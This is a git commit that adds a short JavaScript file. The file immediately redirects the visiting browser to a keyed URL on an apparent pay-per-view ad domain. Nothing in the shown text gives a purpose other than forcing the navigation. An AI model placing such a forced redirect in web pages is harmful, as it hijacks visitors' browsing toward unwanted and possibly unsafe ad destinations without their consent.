67c3b2bfeef5b77f5fbdc69bf01617bee5205af4
Armankhan24 <84512758+Armankhan24@users.noreply.github.com>
2021-05-20 20:31:40 +0700

    Create gulaaren3.js

---
+++ gulaaren3.js
@@ -0,0 +1,5 @@
+var dataUrl = [
+  '//www.achievablecpmrevenue.com/mwq4su0t?key=35a6f3c9cc4b4ad4de4d95065170e1ec'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
